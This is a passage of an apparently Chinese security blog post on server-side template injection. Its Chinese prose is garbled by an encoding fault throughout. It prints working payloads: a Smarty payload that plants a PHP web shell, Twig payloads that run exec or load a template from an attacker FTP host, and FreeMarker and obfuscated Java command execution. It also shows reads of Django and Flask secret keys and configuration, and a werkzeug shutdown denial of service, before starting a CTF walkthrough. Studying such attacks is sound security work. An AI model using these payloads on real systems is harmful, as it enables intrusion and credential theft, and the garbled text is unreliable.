å®‰å…¨å‡½æ•°ç™½åå•ä¸­çš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ¨¡æ¿ä¸­æ— æ³•ç›´æ¥è°ƒç”¨ php ä¸­ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°(ç›¸å½“äºå­˜åœ¨äº†ä¸€ä¸ªdisable_function)ï¼Œä½†å®é™…ä¸Šå¯¹è¯­è¨€çš„é™åˆ¶å¹¶ä¸èƒ½å½±å“æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬é¦–å…ˆè€ƒè™‘çš„åº”è¯¥æ˜¯æ¨¡æ¿æœ¬èº«ï¼Œæ°å¥½$smartyå†…ç½®å˜é‡å¯ç”¨äºè®¿é—®å„ç§ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ self å¾—åˆ° smarty  è¿™ä¸ªç±»ä»¥åæˆ‘ä»¬å°±å»æ‰¾ smarty ç»™æˆ‘ä»¬çš„å¥½ç”¨çš„æ–¹æ³•ï¼Œå¦‚ï¼š</p><blockquote><p><a href="http://www.smartredirect.de/redir/clickGate.php?u=IgKHHLBT&amp;m=1&amp;p=8vZ5ugFkSx&amp;t=vHbSdnLT&amp;st=&amp;s=&amp;url=https%3A%2F%2Fgithub.com%2Fsmarty-php%2Fsmarty%2Fblob%2Ffa269d418fb4d3687558746e67e054c225628d13%2Flibs%2Fsysplugins%2Fsmarty_internal_data.php%23L385&amp;r=https%3A%2F%2Fwww.k0rz3n.com%2F2018%2F11%2F12%2F%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E%2F%230X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">getStreamVariable()</a>å¯ä»¥è·å–ä¼ å…¥å˜é‡çš„æµï¼ˆè¯»æ–‡ä»¶ï¼‰</p><p><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a>(å†™æ–‡ä»¶)è¿™ä¸ªç±»ä¸­æœ‰ä¸€ä¸ªwriteFileæ–¹æ³•:</p><p><code>public function writeFile($_filepath, $_contents, Smarty $smarty)</code></p><p>ä½†ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª Smarty ç±»å‹</p><p><code>self::clearConfig()</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearConfig</span>(<span class="hljs-params">$varname = <span class="hljs-literal">null</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="hljs-keyword">$this</span>, $varname);&#125;</code></pre><p>payload:</p><pre><code class="hljs php-template"><span class="xml">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> passthru($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;,self::clearConfig())&#125;</span></code></pre></blockquote><h5 id="Twig"><a class="header-anchor" href="#Twig">ğŸ­</a>Twig</h5><p>ç›¸æ¯”äº Smarty ,Twig æ— æ³•è°ƒç”¨é™æ€æ–¹æ³•ï¼Œå¹¶ä¸”æ‰€æœ‰å‡½æ•°çš„è¿”å›å€¼éƒ½è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¸èƒ½ä½¿ç”¨ <code>self::</code> è°ƒç”¨é™æ€å˜é‡äº†ï¼Œä½†æŸ¥è¯¢<a href="https://twig.symfony.com/doc/2.x/templates.html">å®˜æ–¹æ–‡æ¡£</a>:</p><p><img src="/2021/04/05/wei/4.png" alt="4"></p><p>Twig æä¾›äº†ä¸€ä¸ª <code>_self</code>, è™½ç„¶ <code>_self</code> æœ¬èº«æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„æ–¹æ³•ï¼Œä½†æœ‰ä¸€ä¸ª env,envæ˜¯æŒ‡å±æ€§Twig_Environmentå¯¹è±¡ï¼ŒTwig_Environmentå¯¹è±¡æœ‰ä¸€ä¸ª  setCacheæ–¹æ³•å¯ç”¨äºæ›´æ”¹Twigå°è¯•åŠ è½½å’Œæ‰§è¡Œç¼–è¯‘æ¨¡æ¿ï¼ˆPHPæ–‡ä»¶ï¼‰çš„ä½ç½®,Twig  çš„æºç ä¸­çš„ environment.php:</p><p><img src="/2021/04/05/wei/5.png" alt="5"></p><p>é€šè¿‡å°†ç¼“å­˜ä½ç½®è®¾ç½®ä¸ºè¿œç¨‹æœåŠ¡å™¨æ¥å¼•å…¥è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´,payload:</p><pre><code class="hljs clojure">&#123; &#123;_self.env.setCache(<span class="hljs-string">&quot;ftp://attacker.net:2121&quot;</span>)&#125; &#125;&#123; &#123;_self.env.loadTemplate(<span class="hljs-string">&quot;backdoor&quot;</span>)&#125; &#125;</code></pre><p>ä½†å› allow_url_include ä¸€èˆ¬æ˜¯ä¸æ‰“å¼€çš„ï¼Œæ²¡æ³•åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œæ•…éœ€åˆ©ç”¨è°ƒç”¨è¿‡æ»¤å™¨çš„å‡½æ•° <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p><p>è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†ä¸€ä¸ª call_user_function æ–¹æ³•</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFilter</span>(<span class="hljs-params">$name</span>)</span><span class="hljs-function"></span>&#123;        [snip]        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filterCallbacks <span class="hljs-keyword">as</span> $callback) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> !== $filter = call_user_func($callback, $name)) &#123;<span class="hljs-comment">//æ³¨æ„è¿™è¡Œ</span>            <span class="hljs-keyword">return</span> $filter;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">registerUndefinedFilterCallback</span>(<span class="hljs-params">$callable</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">$this</span>-&gt;filterCallbacks[] = $callable;&#125;</code></pre><p>æŠŠexec() ä½œä¸ºå›è°ƒå‡½æ•°ä¼ è¿›å»å³å¯ï¼Œpayloadï¼š</p><pre><code class="hljs clojure">&#123; &#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125; &#125;&#123; &#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125; &#125;</code></pre><h5 id="freeMarker"><a class="header-anchor" href="#freeMarker">ğŸ­</a>freeMarker</h5><p>payload:</p><pre><code class="hljs vim">&lt;#assign <span class="hljs-keyword">ex</span>=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt; $&#123; <span class="hljs-keyword">ex</span>(<span class="hljs-string">&quot;id&quot;</span>) &#125;</code></pre><h4 id="åˆ©ç”¨æ¡†æ¶æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨æ¡†æ¶æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»">ğŸ­</a>åˆ©ç”¨æ¡†æ¶æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»</h4><h5 id="Django"><a class="header-anchor" href="#Django">ğŸ­</a>Django</h5><p>æ€è·¯:Djangoæ˜¯ä¸€ä¸ªåºå¤§çš„æ¡†æ¶ï¼Œå…¶æ•°æ®åº“å…³ç³»é”™ç»¼å¤æ‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å±æ€§ä¹‹é—´çš„å…³ç³»å»ä¸€ç‚¹ç‚¹æŒ–æ˜æ•æ„Ÿä¿¡æ¯ã€‚ä½†Djangoä»…ä»…æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œåœ¨æ²¡æœ‰ç›®æ ‡æºç çš„æƒ…å†µä¸‹å¾ˆéš¾å»æŒ–æ˜ä¿¡æ¯ï¼Œæ•…æˆ‘ä»¬å¯ä»¥å»æŒ–æ˜Djangoè‡ªå¸¦çš„åº”ç”¨ä¸­çš„ä¸€äº›è·¯å¾„ï¼Œæœ€ç»ˆè¯»å–åˆ°Djangoçš„é…ç½®é¡¹</p><p>Djangoè‡ªå¸¦çš„åº”ç”¨â€œadminâ€ï¼ˆåå°ï¼‰çš„models.pyä¸­å¯¼å…¥äº†å½“å‰ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼š</p><p><img src="/2021/04/05/wei/6.png" alt="6"></p><p>æ€è·¯ï¼šé€šè¿‡æŸç§æ–¹å¼æ‰¾åˆ°Djangoé»˜è®¤åº”ç”¨adminçš„modelï¼Œå†é€šè¿‡è¿™ä¸ªmodelè·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€WebåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯ã€‚</p><p>payload:</p><pre><code class="hljs roboconf">http://localhost:8000/?email=&#123;<span class="hljs-attribute">user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><span class="hljs-attribute"></span><span class="hljs-attribute">http</span>://localhost:8000/?email=&#123;user<span class="hljs-variable">.user_permissions</span><span class="hljs-variable">.model</span><span class="hljs-variable">._meta</span><span class="hljs-variable">.app_config</span><span class="hljs-variable">.module</span><span class="hljs-variable">.admin</span><span class="hljs-variable">.settings</span><span class="hljs-variable">.SECRET_KEY</span>&#125;</code></pre><h4 id="åˆ©ç”¨æ¨¡è¯­è¨€æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨æ¨¡è¯­è¨€æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»">ğŸ­</a>åˆ©ç”¨æ¨¡è¯­è¨€æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»</h4><h5 id="python"><a class="header-anchor" href="#python">ğŸ­</a>python</h5><p><strong>os.system()</strong></p><blockquote><p>ç”¨æ³•ï¼šos.system(command)</p><blockquote><p>è¿™ä¸ªè°ƒç”¨ç›¸å½“ç›´æ¥ï¼Œä¸”æ˜¯åŒæ­¥è¿›è¡Œçš„ï¼Œç¨‹åºéœ€è¦<strong>é˜»å¡</strong>å¹¶ç­‰å¾…è¿”å›ã€‚è¿”å›å€¼æ˜¯ä¾èµ–äºç³»ç»Ÿçš„ï¼Œç›´æ¥è¿”å›ç³»ç»Ÿçš„è°ƒç”¨è¿”å›å€¼ã€‚<br>æ³¨æ„ï¼šè¯¥å‡½æ•°è¿”å›å‘½ä»¤<strong>æ‰§è¡Œç»“æœçš„è¿”å›å€¼</strong>ï¼Œå¹¶ä¸æ˜¯è¿”å›å‘½ä»¤çš„æ‰§è¡Œè¾“å‡ºï¼ˆæ‰§è¡ŒæˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1ï¼‰<br><a href="https://blog.csdn.net/lwgkzl/article/details/81060016">å…³äºlinuxä¸‹os.system()è¿”å›å€¼è¯´æ˜</a></p></blockquote></blockquote><p><strong>os.popen()</strong></p><blockquote><p>ç”¨æ³•ï¼šos.popen(command[,mode[,bufsize]])</p><blockquote><p>è¯´æ˜ï¼š<strong>mode</strong> â€“ æ¨¡å¼æƒé™å¯ä»¥æ˜¯ â€˜râ€™(é»˜è®¤) æˆ– â€˜wâ€™ã€‚<br>popenæ–¹æ³•é€šè¿‡p.read()è·å–ç»ˆç«¯è¾“å‡ºï¼Œè€Œä¸”popenéœ€è¦å…³é—­close().å½“æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œclose()ä¸è¿”å›ä»»ä½•å€¼ï¼Œå¤±è´¥æ—¶ï¼Œclose()è¿”å›ç³»ç»Ÿè¿”å›å€¼ï¼ˆå¤±è´¥è¿”å›1ï¼‰. å¯è§å®ƒè·å–è¿”å›å€¼çš„æ–¹å¼å’Œos.systemä¸åŒã€‚ç”¨read()å¯ä»¥æŠŠç»“æœå›æ˜¾ã€‚</p></blockquote></blockquote><p><strong>subprocess</strong></p><blockquote><p>subprocess æ¨¡å—æœ‰æ¯”è¾ƒå¤šçš„åŠŸèƒ½ï¼Œsubprocessæ¨¡å—è¢«æ¨èç”¨æ¥æ›¿æ¢ä¸€äº›è€çš„æ¨¡å—å’Œå‡½æ•°ï¼Œå¦‚ï¼šos.systemã€os.spawnã€os.popenç­‰<br>subprocessæ¨¡å—ç›®çš„æ˜¯<strong>å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹å¹¶ä¸ä¹‹é€šä¿¡</strong>ã€‚è¿™é‡Œåªè®²ç”¨æ¥è¿è¡Œshellå‘½ä»¤çš„ä¸¤ä¸ªå¸¸ç”¨æ–¹æ³•ã€‚</p><blockquote><p><strong>subprocess.call(â€œcommandâ€)</strong><br>çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹å®Œæˆ<br>è¿”å›é€€å‡ºä¿¡æ¯(returncodeï¼Œç›¸å½“äºLinux exit code)<br>ä¸os.systemåŠŸèƒ½ç›¸ä¼¼,ä¹Ÿæ— æ‰§è¡Œç»“æœçš„å›æ˜¾</p><p><strong>subprocess.Popen(â€œcommandâ€)</strong><br>è¯´æ˜ï¼š<code>class subprocess.Popen(args, bufsize=0, executable=None,  stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False,  shell=False, cwd=None, env=None, universal_newlines=False,  startupinfo=None, creationflags=0)</code><br>Popenéå¸¸å¼ºå¤§ï¼Œæ”¯æŒå¤šç§å‚æ•°å’Œæ¨¡å¼ï¼Œé€šè¿‡å…¶æ„é€ å‡½æ•°å¯ä»¥çœ‹åˆ°æ”¯æŒå¾ˆå¤šå‚æ•°ã€‚ä½†Popenå‡½æ•°å­˜åœ¨ç¼ºé™·åœ¨äºï¼Œ<strong>å®ƒæ˜¯ä¸€ä¸ªé˜»å¡çš„æ–¹æ³•</strong>ï¼Œå¦‚æœè¿è¡Œcmdå‘½ä»¤æ—¶äº§ç”Ÿå†…å®¹éå¸¸å¤šï¼Œå‡½æ•°å°±å®¹æ˜“é˜»å¡ã€‚å¦ä¸€ç‚¹ï¼Œ<strong>Popenæ–¹æ³•ä¹Ÿä¸ä¼šæ‰“å°å‡ºcmdçš„æ‰§è¡Œä¿¡æ¯</strong>ã€‚</p></blockquote></blockquote><h5 id="JAVA"><a class="header-anchor" href="#JAVA">ğŸ­</a>JAVA</h5><p>java.langåŒ…æ˜¯javaè¯­è¨€çš„æ ¸å¿ƒï¼Œå®ƒæä¾›äº†javaä¸­çš„åŸºç¡€ç±»ã€‚åŒ…æ‹¬åŸºæœ¬Objectç±»ã€Classç±»ã€Stringç±»ã€åŸºæœ¬ç±»å‹çš„åŒ…è£…ç±»ã€åŸºæœ¬çš„æ•°å­¦ç±»ç­‰ç­‰æœ€åŸºæœ¬çš„ç±»ã€‚</p><p>payloadï¼š</p><pre><code class="hljs jboss-cli">$&#123;T<span class="hljs-params">(java.lang.System)</span><span class="hljs-string">.getenv</span><span class="hljs-params">()</span>&#125;$&#123;T<span class="hljs-params">(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(&#x27;cat etc/passwd&#x27;)</span>&#125;æ–‡ä»¶æ“ä½œï¼š$&#123;T<span class="hljs-params">(org.apache.commons.io.IOUtils)</span><span class="hljs-string">.toString</span><span class="hljs-params">(T(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(99)</span><span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(97)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(116)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(32)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(47)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(101)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(116)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(99)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(47)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(112)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(97)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(115)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(115)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(119)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(100)</span>))<span class="hljs-string">.getInputStream</span><span class="hljs-params">()</span>)&#125;</code></pre><h3 id="æ”»å‡»æ–¹å‘-äºŒ"><a class="header-anchor" href="#æ”»å‡»æ–¹å‘-äºŒ">ğŸ­</a>æ”»å‡»æ–¹å‘(äºŒ)</h3><blockquote><p>æŸ¥é…ç½®æ–‡ä»¶</p><blockquote><p>å¸¸è§é…ç½®æ–‡ä»¶:</p><blockquote><p>request</p><p>æŸ¥çœ‹flaskæ–‡æ¡£å¯çŸ¥:<code>request</code>æ˜¯Flaskæ¨¡ç‰ˆçš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå…¶ä»£è¡¨â€œå½“å‰è¯·æ±‚å¯¹è±¡(flask.request)â€ï¼Œåœ¨è§†å›¾ä¸­è®¿é—®<code>request</code>å¯¹è±¡èƒ½çœ‹åˆ°å¾ˆå¤šæœŸå¾…çš„ä¿¡æ¯ã€‚åœ¨<code>request</code> å¯¹è±¡ä¸­æœ‰ä¸€ä¸ª<code>environ</code>å¯¹è±¡åã€‚<code>request.environ</code>å¯¹è±¡æ˜¯ä¸€ä¸ªä¸æœåŠ¡å™¨ç¯å¢ƒç›¸å…³çš„å¯¹è±¡å­—å…¸ï¼Œå­—å…¸ä¸­ä¸€ä¸ªåä¸º<code>shutdown_server</code>çš„æ–¹æ³•ååˆ†é…çš„é”®ä¸º<code>werkzeug.server.shutdown</code>ï¼Œæ³¨å°„<code>&#123; &#123; request.environ['werkzeug.server.shutdown']() &#125; &#125;</code>åœ¨æœåŠ¡ç«¯ä¼šå½¢æˆä¸€ä¸ªå½±å“æä½çš„æ‹’ç»æœåŠ¡ï¼Œä½¿ç”¨gunicornè¿è¡Œåº”ç”¨ç¨‹åºè¿™ä¸ªæ–¹æ³•çš„æ•ˆæœä¾¿æ¶ˆå¤±ã€‚</p><p>config</p><p><code>config</code>ä¹Ÿæ˜¯Flaskæ¨¡ç‰ˆä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå®ƒä»£è¡¨â€œå½“å‰é…ç½®å¯¹è±¡(flask.config)â€ï¼Œå®ƒæ˜¯ä¸€ä¸ªç±»å­—å…¸çš„å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒåŒ…å«äº†æ¯”å¦‚æ•°æ®åº“é“¾æ¥å­—ç¬¦ä¸²ï¼Œè¿æ¥åˆ°ç¬¬ä¸‰æ–¹çš„å‡­è¯ï¼Œ<code>SECRET_KEY</code>ç­‰æ•æ„Ÿå€¼ã€‚æŸ¥çœ‹è¿™äº›é…ç½®é¡¹ç›®ï¼Œåªéœ€æ³¨å…¥<code>&#123; &#123; config.items() &#125; &#125;</code>æœ‰æ•ˆè½½è·ã€‚å®ƒçš„å­ç±»åŒ…å«å¤šä¸ªç‹¬ç‰¹çš„æ–¹æ³•ï¼š<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code>, ä»¥åŠ<code>root_path</code></p></blockquote></blockquote></blockquote><blockquote><p>å‘½ä»¤æ‰§è¡Œï¼ˆæ²™ç›’é€ƒé€¸ç±»é¢˜ç›®çš„åˆ©ç”¨æ–¹å¼ï¼‰</p></blockquote><h4 id="æŸ¥é…ç½®æ–‡ä»¶"><a class="header-anchor" href="#æŸ¥é…ç½®æ–‡ä»¶">ğŸ­</a>æŸ¥é…ç½®æ–‡ä»¶</h4><h5 id="Flask-Jinja2"><a class="header-anchor" href="#Flask-Jinja2">ğŸ­</a>Flask/Jinja2</h5><p><strong>æ¨¡æ¿</strong></p><pre><code class="hljs dust"><span class="hljs-template-variable">&#123; &#123; ... &#125;</span><span class="xml"> &#125;ï¼šè£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨ä¼ è¿›æ¥çš„åŒåå‚æ•°è¿™ä¸ªå˜é‡ä»£è¡¨çš„å€¼æ›¿æ¢æ‰ã€‚</span><span class="hljs-template-variable">&#123; % ... % &#125;</span><span class="xml">ï¼šè£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥ã€‚</span><span class="hljs-template-variable">&#123; # ... # &#125;</span><span class="xml">ï¼šè£…è½½ä¸€ä¸ªæ³¨é‡Šï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ä¼šå¿½è§†è¿™ä¸­é—´çš„å€¼</span></code></pre><p><strong>å˜é‡</strong></p><p>åœ¨æ¨¡æ¿ä¸­æ·»åŠ å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨ï¼ˆsetï¼‰è¯­å¥ã€‚</p><pre><code class="hljs routeros">&#123; % <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;xx&#x27;</span> % &#125;</code></pre><p>withè¯­å¥æ¥åˆ›å»ºä¸€ä¸ªå†…éƒ¨çš„ä½œç”¨åŸŸï¼Œå°†setè¯­å¥æ”¾åœ¨å…¶ä¸­ï¼Œè¿™æ ·åˆ›å»ºçš„å˜é‡åªåœ¨withä»£ç å—ä¸­æ‰æœ‰æ•ˆ</p><pre><code class="hljs clojure">&#123; % with gg = <span class="hljs-number">42</span> % &#125;&#123; &#123; gg &#125; &#125;&#123; % endwith % &#125;</code></pre><p><strong>ifè¯­å¥</strong></p><pre><code class="hljs erlang-repl">&#123; <span class="hljs-comment">% if ken.sick % &#125;</span>Ken is sick.&#123; <span class="hljs-comment">% elif ken.dead % &#125;</span>You killed Ken! You bastard!!!&#123; <span class="hljs-comment">% else % &#125;</span>Kenny looks okay --- so far&#123; <span class="hljs-comment">% endif % &#125;</span></code></pre><p><strong>forè¯­å¥</strong></p><pre><code class="hljs routeros">&#123; % <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-keyword">in</span><span class="hljs-built_in"> users </span>% &#125;&#123; &#123; user.username|e &#125; &#125;&#123; % endfor % &#125;</code></pre><p>éå†</p><pre><code class="hljs xquery">&#123; % <span class="hljs-keyword">for</span><span class="hljs-built_in"> key</span>, <span class="hljs-keyword">value</span> <span class="hljs-keyword">in</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>my_dict.iteritems()<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span> % &#125;&amp;<span class="hljs-literal">lt</span>;dt&amp;<span class="hljs-literal">gt</span>;&#123; &#123;<span class="hljs-built_in"> key</span>|e &#125; &#125;&amp;<span class="hljs-literal">lt</span>;/dt&amp;<span class="hljs-literal">gt</span>;&amp;<span class="hljs-literal">lt</span>;dd&amp;<span class="hljs-literal">gt</span>;&#123; &#123; <span class="hljs-keyword">value</span>|e &#125; &#125;&amp;<span class="hljs-literal">lt</span>;/dd&amp;<span class="hljs-literal">gt</span>;&#123; % endfor % &#125;</code></pre><p>Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡</p><ul><li><p>loop.index å½“å‰è¿­ä»£çš„ç´¢å¼•ï¼ˆä»1å¼€å§‹ï¼‰</p></li><li><p>loop.index0 å½“å‰è¿­ä»£çš„ç´¢å¼•ï¼ˆä»0å¼€å§‹ï¼‰</p></li><li><p>loop.first æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›True/False</p></li><li><p>loop.last æ˜¯å¦æ˜¯æœ€åä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›True/False</p></li><li><p>loop.length åºåˆ—çš„é•¿åº¦</p></li></ul><p>æ³¨æ„ï¼šä¸å¯ä»¥ä½¿ç”¨continueå’Œbreakè¡¨è¾¾å¼æ¥æ§åˆ¶å¾ªç¯çš„æ‰§è¡Œã€‚</p><p><strong>è¿‡æ»¤å™¨</strong></p><p>è¿‡æ»¤å™¨æ˜¯é€šè¿‡ï¼ˆ|ï¼‰ç¬¦å·è¿›è¡Œä½¿ç”¨çš„ï¼Œä¾‹å¦‚ï¼š{ { name|length } }ï¼šå°†è¿”å›nameçš„é•¿åº¦</p><p>ç±»ä¼¼äºæˆ‘ä»¬å¹³å¸¸çš„çš„å‡½æ•°ï¼Œä»–ä»–è¿™ç§åº”è¯¥å°±æ˜¯å†…ç½®å‡½æ•°ï¼Œå› ä¸ºå®ƒæœ¬èº«å°±å«æœ‰å¾ˆå¤šè¿‡æ»¤å™¨</p><pre><code class="hljs pgsql">abs(<span class="hljs-keyword">value</span>)ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ã€‚ç¤ºä¾‹ï¼š<span class="hljs-number">-1</span>|abslast(<span class="hljs-keyword">value</span>)ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚ç¤ºä¾‹ï¼šnames|lastã€‚length(<span class="hljs-keyword">value</span>)ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ã€‚ç¤ºä¾‹ï¼šnames|lengthã€‚<span class="hljs-keyword">join</span>(<span class="hljs-keyword">value</span>,d=u<span class="hljs-string">&#x27;&#x27;</span>)ï¼šå°†ä¸€ä¸ªåºåˆ—ç”¨dè¿™ä¸ªå‚æ•°çš„å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚<span class="hljs-type">int</span>(<span class="hljs-keyword">value</span>)ï¼šå°†å€¼è½¬æ¢ä¸º<span class="hljs-type">int</span>ç±»å‹ã€‚<span class="hljs-type">float</span>(<span class="hljs-keyword">value</span>)ï¼šå°†å€¼è½¬æ¢ä¸º<span class="hljs-type">float</span>ç±»å‹ã€‚lower(<span class="hljs-keyword">value</span>)ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ã€‚upper(<span class="hljs-keyword">value</span>)ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™</code></pre><h6 id="2018æŠ¤ç½‘æ¯easy-tornado"><a class="header-anchor" href="#2018æŠ¤ç½‘æ¯easy-tornado">ğŸ­</a>2018æŠ¤ç½‘æ¯easy_tornado</h6><p>tornadoæ˜¯pythonä¸­çš„ä¸€ä¸ªwebåº”ç”¨æ¡†æ¶ã€‚é¢˜ç›®æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><blockquote><p>flag.txt</p><blockquote><p><code>flag in /fllllllllllllag</code></p></blockquote></blockquote><blockquote><p>welcome.txt</p><blockquote><p><code>render</code></p><p>renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œæ¸²æŸ“å˜é‡åˆ°æ¨¡æ¿ä¸­ï¼Œå³å¯ä»¥é€šè¿‡ä¼ 